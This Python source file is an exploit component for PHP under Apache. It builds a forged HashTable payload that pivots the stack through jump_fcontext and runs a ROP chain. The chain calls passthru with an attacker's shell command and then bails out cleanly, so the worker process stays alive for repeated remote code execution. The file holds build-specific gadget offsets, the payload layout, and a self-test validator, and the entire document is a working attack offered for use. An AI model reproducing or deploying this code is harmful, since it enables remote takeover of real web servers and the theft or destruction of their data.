#!/usr/bin/env python3
# INDEX: worker-surviving rce via jump_fcontext rop | apache | forged-dtor reclaim landed
"""Worker-surviving RCE dispatch primitive:
jump_fcontext -> ROP -> zif_passthru -> _zend_bailout.

Technique from Karasawa (worker-surviving jump_fcontext/boost_context stack-pivot; 8.5.4 reference values re-derived on our libphp).

Keeps the SAME sink the CVE-2026-109619 exploit lands (the destructor-call
zend_hash_destroy/zend_array_destroy over the reclaimed PS(http_session_vars)
-> ht->pDestructor(&bucket->val)), but instead of pointing pDestructor straight
at zif_system it points it at a boost_context stack-pivot inside jump_fcontext.
The pivot repoints %rsp into the forged array body, where a short ROP chain
calls zif_passthru(cmd) through the normal PHP output layer (so command output
flushes into the HTTP 200 body under output_buffering) and then calls
_zend_bailout, which longjmp()s to the active request bailout handler for a
CLEAN request teardown -> the Apache prefork child stays alive, enabling
repeatable, multi-command RCE.

Preconditions: a forged-dtor reclaim has landed (forged HashTable at base S),
the libphp.so load base, and a command <= CMD_MAX (71 bytes on these builds).

The pivot (boost_context asm):

    jump_fcontext+0x2e:  mov  %rdi,%rsp        ; rsp := &bucket->val  (== V)
                         mov  0x40(%rsp),%r8   ; r8  := *(V+0x40)  (first gadget)
                         ldmxcsr (%rsp)        ; reads V+0x00  (needs valid mxcsr)
                         fldcw  0x4(%rsp)      ; reads V+0x04  (needs valid fcw)
                         mov  0x10(%rsp),%r12  ; V+0x10
                         ... r13/r14/r15/rbx/rbp from V+0x18..0x38
                         lea  0x48(%rsp),%rsp  ; rsp := V+0x48
                         mov  %rsi,%rdx ; mov %rax,%rdi
                         jmp  *%r8             ; -> first ROP gadget, stack @ V+0x48

So the pivot is NOT a ret-into-chain: it `jmp`s to r8=*(V+0x40) with rsp=V+0x48.
We set r8 = `pop rdi ; ret`, which then consumes the ROP frame laid from V+0x48.
The load-rsp instruction is at jump_fcontext+0x2e on both builds below.

Layout (FA = forged array base = where the forged fake-reference ptr points; V = FA+0x20
= &bucket[0].val = rdi at the pDestructor call = rsp after the pivot):

    FA+0x00  HashTable header (gc rc=1/IS_ARRAY, flags, mask, arData=FA+0x20,
             nNumUsed=1, nNumOfElements=1)   -- the forged HashTable header
    FA+0x20  V+0x00  mxcsr=0x1f80 (dword) + fcw=0x037f (word @ V+0x04)
    FA+0x30  V+0x10  pDestructor = libphp+pivot  (also read into r12; harmless)
    FA+0x38  V+0x18  r13 = 0
    FA+0x40  V+0x20  r14 = 0
    FA+0x48  V+0x28  r15 = 0
    FA+0x50  V+0x30  rbx = 0
    FA+0x58  V+0x38  rbp = 0
    FA+0x60  V+0x40  r8  = pop_rdi            (jmp target; first gadget)
    FA+0x68  V+0x48  rdi = &execute_data (FA+0xA0)
    FA+0x70  V+0x50  pop_rsi
    FA+0x78  V+0x58  rsi = &return_value (FA+0x160)
    FA+0x80  V+0x60  zif_passthru
    FA+0x88  V+0x68  pop_rdi
    FA+0x90  V+0x70  rdi = 0
    FA+0x98  V+0x78  _zend_bailout
    FA+0xA0  fake zend_execute_data: num_args=1 @ +0x2C, arg1 zval @ +0x50
    FA+0xF0  arg1 zval: value=&zend_string (FA+0x100), type_info=IS_STRING(6)
    FA+0x100 fake zend_string: rc=1, type_info, h, len, bytes @ +0x18 (FA+0x118)
    FA+0x118 command bytes + NUL  (up to 0x48 = 72 bytes before return_value)
    FA+0x160 return_value: 16-byte writable zval scratch (passthru RETVAL_*)

The sink calls pDestructor(&bucket->val) i.e. rdi = FA+0x20 = V; this is exactly
the same (S+0x20) execute_data address the forged HashTable header expects, so
that header and the fake-reference groom are reused verbatim - only the
pDestructor target and the body after FA+0x20 change.

Pure stdlib; python3 -I safe. Run directly for a self-test / hexdump.
"""

import struct
import sys


# libphp.so-relative gadget offsets, per build (tested: 8.5.12-apache and
# 8.4.26-apache mod_php). jump_fcontext / _zend_bailout are exported (.dynsym);
# zif_passthru is a local .symtab symbol; the pop/ret gadgets are byte-scanned
# from the executable PT_LOAD segment. 'pivot' = jump_fcontext + 0x2e
# (the `mov %rdi,%rsp`).
SURVIVE_OFFSETS = {
    "8.5.12-apache": {
        "jump_fcontext": 0x652230,
        "pivot":         0x65225E,   # jump_fcontext + 0x2e  (mov %rdi,%rsp)
        "zif_passthru":  0x59FAF0,   # zif_system(0x59fae0) + 0x10  (adjacent)
        "zend_bailout":  0x1EB03B,   # _zend_bailout
        "pop_rdi":       0x198309,   # pop %rdi ; ret
        "pop_rsi":       0x196C35,   # pop %rsi ; ret
        "pop_rsi_rbp":   0x3EE49E,   # pop %rsi ; pop %rbp ; ret  (variant)
        "ret":           0x19830A,   # bare ret (alignment)
        # cross-check anchors:
        "zif_system":        0x59FAE0,
        "zval_ptr_dtor":     0x7C11A0,
        "zend_array_destroy":0x7752A0,
    },
    "8.4.26-apache": {
        "jump_fcontext": 0x4F8140,
        "pivot":         0x4F816E,   # jump_fcontext + 0x2e  (mov %rdi,%rsp)
        "zif_passthru":  0x465380,   # zif_system(0x465370) + 0x10  (adjacent)
        "zend_bailout":  0x1B15CC,   # _zend_bailout
        "pop_rdi":       0x166CB7,   # pop %rdi ; ret
        "pop_rsi":       0x165728,   # pop %rsi ; ret
        "pop_rsi_rbp":   0x3A5DBE,   # pop %rsi ; pop %rbp ; ret  (variant)
        "ret":           0x166CB8,   # bare ret (alignment)
        # cross-check anchors:
        "zif_system":        0x465370,
        "zval_ptr_dtor":     0x65EB60,
        "zend_array_destroy":0x613B40,
    },
}

# executable PT_LOAD segment of each module (vaddr == file offset in it); used
# by validate() to assert every forged code pointer lands in executable text.
EXEC_RANGE = {
    "8.5.12-apache": (0x184000, 0x184000 + 0x646EC1),
    "8.4.26-apache": (0x156000, 0x156000 + 0x5124AD),
}

# x87/SSE control words the pivot's ldmxcsr/fldcw load from V+0x00 / V+0x04.
MXCSR_DEFAULT = 0x1F80   # SSE default; reserved bits clear -> ldmxcsr won't #GP
FCW_DEFAULT = 0x037F     # x87 default control word

# FA-relative slot map (see module docstring).
_V = 0x20                 # V = FA + 0x20  (&bucket[0].val)
_ED = 0xA0                # fake zend_execute_data
_ARG1 = _ED + 0x50        # 0xF0  arg1 zval
_STR = 0x100              # fake zend_string
_CMD = _STR + 0x18        # 0x118 command bytes
_RV = 0x160               # return_value scratch zval
_SIZE = 0x180             # 384 bytes (forged-array footprint)
CMD_MAX = _RV - _CMD - 1  # 0x48 - 1 = 71 bytes (NUL-terminated)


def build_survive_ht(S, libphp_base, cmd, off, pop_rsi_extra=False, size=_SIZE):
    """Build the forged-array body with a WORKER-SURVIVING pDestructor:
    jump_fcontext pivot -> ROP -> passthru(cmd) -> _zend_bailout.

      S            forged array base (FA) = the address the forged fake-reference
                   ptr points at (chunk_base + the groom's fake-array offset).
      libphp_base  mod_php module base (elf/pie base of libphp.so).
      cmd          shell command (bytes or str), <= CMD_MAX bytes.
      off          a SURVIVE_OFFSETS[...] dict (libphp-relative gadget offsets).
      pop_rsi_extra  use a `pop rsi ; pop rbp ; ret` gadget (consumes one extra
                   stack slot for rbp) instead of `pop rsi ; ret`.

    Returns `size` bytes to drop in as the `ht` form-field value.
    """
    if isinstance(cmd, str):
        cmd = cmd.encode("latin-1")
    if len(cmd) > (size - _CMD - 1):
        raise ValueError(f"command {len(cmd)}B exceeds max {size - _CMD - 1}B")

    def A(name):            # absolute address of a libphp offset
        return libphp_base + off[name]

    b = bytearray(size)

    # --- forged HashTable header --------------------------------------------
    struct.pack_into("<II", b, 0x00, 1, 7)               # gc: rc=1, IS_ARRAY
    struct.pack_into("<II", b, 0x08, 0x10, 0xFFFFFFF8)   # flags, nTableMask
    struct.pack_into("<Q", b, 0x10, S + _V)              # arData -> &bucket[0]
    struct.pack_into("<II", b, 0x18, 1, 1)               # nNumUsed/nNumOfElems
    struct.pack_into("<Q", b, 0x30, A("pivot"))          # pDestructor = pivot

    # --- pivot landing at V = FA+0x20 (= rsp after the pivot) ---------------
    struct.pack_into("<I", b, _V + 0x00, MXCSR_DEFAULT)  # ldmxcsr (%rsp)
    struct.pack_into("<H", b, _V + 0x04, FCW_DEFAULT)    # fldcw  0x4(%rsp)
    # V+0x10..0x38 -> r12/r13/r14/r15/rbx/rbp; FA+0x30 (=V+0x10) already = pivot
    # (read into r12, harmless); the rest stay 0.
    struct.pack_into("<Q", b, _V + 0x40, A("pop_rdi"))   # r8 = first gadget

    # --- ROP frame, consumed from V+0x48 ------------------------------------
    rop = []
    rop.append(S + _ED)                                  # -> rdi = &execute_data
    if pop_rsi_extra:
        rop.append(A("pop_rsi_rbp"))
        rop.append(S + _RV)                              # -> rsi = &return_value
        rop.append(0)                                    #    rbp (discarded)
    else:
        rop.append(A("pop_rsi"))
        rop.append(S + _RV)                              # -> rsi = &return_value
    rop.append(A("zif_passthru"))                        # passthru(ED, RV)
    rop.append(A("pop_rdi"))
    rop.append(0)                                        # -> rdi = 0
    rop.append(A("zend_bailout"))                        # longjmp -> survive
    off_rop = _V + 0x48
    for i, w in enumerate(rop):
        struct.pack_into("<Q", b, off_rop + 8 * i, w)
    if off_rop + 8 * len(rop) > _ED:
        raise ValueError("ROP frame overruns the fake execute_data")

    # --- fake zend_execute_data at FA+0xA0 ----------------------------------
    #   func (+0x18) only read by ZPP on an arg error; a valid IS_STRING arg +
    #   num_args=1 keeps us on the fast path, so point it at readable memory.
    struct.pack_into("<Q", b, _ED + 0x18, S + _ED)       # func -> readable
    struct.pack_into("<I", b, _ED + 0x2C, 1)             # This.u2.num_args = 1
    struct.pack_into("<Q", b, _ARG1 + 0x00, S + _STR)    # arg1 value = &str
    struct.pack_into("<I", b, _ARG1 + 0x08, 6)           # arg1 type = IS_STRING

    # --- fake zend_string (the command) at FA+0x100 -------------------------
    struct.pack_into("<II", b, _STR + 0x00, 1, 0x106)    # gc rc=1, IS_STRING
    struct.pack_into("<Q", b, _STR + 0x08, 0)            # h
    struct.pack_into("<Q", b, _STR + 0x10, len(cmd))     # len
    b[_CMD:_CMD + len(cmd)] = cmd
    b[_CMD + len(cmd)] = 0                               # NUL

    # --- return_value scratch (FA+0x160) stays zeroed (IS_UNDEF) ------------
    return bytes(b)


def validate(blob, S, libphp_base, off, build_key=None):
    """Structural self-check: assert the forged code pointers land in the
    module's executable text and the internal data pointers resolve inside the
    blob.  Returns a dict of the resolved absolute addresses."""
    V = S + _V
    picks = {
        "pDestructor@FA+0x30": struct.unpack_from("<Q", blob, 0x30)[0],
        "r8/pop_rdi@V+0x40":   struct.unpack_from("<Q", blob, _V + 0x40)[0],
        "rdi=&ED@V+0x48":      struct.unpack_from("<Q", blob, _V + 0x48)[0],
        "pop_rsi@V+0x50":      struct.unpack_from("<Q", blob, _V + 0x50)[0],
        "rsi=&RV@V+0x58":      struct.unpack_from("<Q", blob, _V + 0x58)[0],
        "zif_passthru@V+0x60": struct.unpack_from("<Q", blob, _V + 0x60)[0],
        "pop_rdi@V+0x68":      struct.unpack_from("<Q", blob, _V + 0x68)[0],
        "zend_bailout@V+0x78": struct.unpack_from("<Q", blob, _V + 0x78)[0],
        "arData@FA+0x10":      struct.unpack_from("<Q", blob, 0x10)[0],
        "arg1.str@FA+0xF0":    struct.unpack_from("<Q", blob, _ARG1)[0],
    }
    code_ptrs = ["pDestructor@FA+0x30", "r8/pop_rdi@V+0x40", "pop_rsi@V+0x50",
                 "zif_passthru@V+0x60", "pop_rdi@V+0x68", "zend_bailout@V+0x78"]
    errs = []
    if build_key and build_key in EXEC_RANGE:
        lo, hi = EXEC_RANGE[build_key]
        lo += libphp_base
        hi += libphp_base
        for k in code_ptrs:
            if not (lo <= picks[k] < hi):
                errs.append(f"{k}={picks[k]:#x} outside exec [{lo:#x},{hi:#x})")
    if picks["arData@FA+0x10"] != V:
        errs.append(f"arData {picks['arData@FA+0x10']:#x} != V {V:#x}")
    if picks["rdi=&ED@V+0x48"] != S + _ED:
        errs.append("rdi(&ED) mismatch")
    if picks["rsi=&RV@V+0x58"] != S + _RV:
        errs.append("rsi(&RV) mismatch")
    if picks["arg1.str@FA+0xF0"] != S + _STR:
        errs.append("arg1.str mismatch")
    # mxcsr/fcw sanity
    mx = struct.unpack_from("<I", blob, _V)[0]
    if mx & ~0xFFFF or mx != MXCSR_DEFAULT:
        errs.append(f"mxcsr {mx:#x} invalid")
    if errs:
        raise AssertionError("; ".join(errs))
    return picks


def _hexdump(b, base=0):
    out = []
    for i in range(0, len(b), 16):
        row = b[i:i + 16]
        hx = " ".join(f"{x:02x}" for x in row)
        out.append(f"  {base + i:#06x}  {hx:<47}")
    return "\n".join(out)


def _selftest(key):
    off = SURVIVE_OFFSETS[key]
    libphp_base = 0x7F0000000000     # arbitrary page-aligned base for the test
    S = 0x7F1234500000               # arbitrary forged-array base
    cmd = b"id"
    blob = build_survive_ht(S, libphp_base, cmd, off)
    picks = validate(blob, S, libphp_base, off, build_key=key)
    print(f"=== self-test {key} ===")
    print(f"  libphp_base = {libphp_base:#x}  FA(S) = {S:#x}  cmd = {cmd!r}")
    print(f"  blob size   = {len(blob)} bytes   (CMD_MAX = {CMD_MAX})")
    for k, v in picks.items():
        tag = ""
        if "@" in k and v and (libphp_base <= v < libphp_base + 0x1000000):
            tag = f"  (libphp+{v - libphp_base:#x})"
        print(f"    {k:<22} = {v:#x}{tag}")
    print("  gadget offsets (libphp-relative):")
    for k in ("pivot", "pop_rdi", "pop_rsi", "pop_rsi_rbp", "ret",
              "zif_passthru", "zend_bailout"):
        print(f"    {k:<14} = {off[k]:#x}")
    print("  VALIDATE: OK (all code ptrs in exec text, data ptrs consistent)")
    print("  first 0xA0 bytes of forged body:")
    print(_hexdump(blob[:0xA0], S))
    print()


if __name__ == "__main__":
    keys = sys.argv[1:] or ["8.5.12-apache", "8.4.26-apache"]
    for k in keys:
        if k not in SURVIVE_OFFSETS:
            print(f"unknown build key {k!r}; known: {list(SURVIVE_OFFSETS)}")
            continue
        _selftest(k)
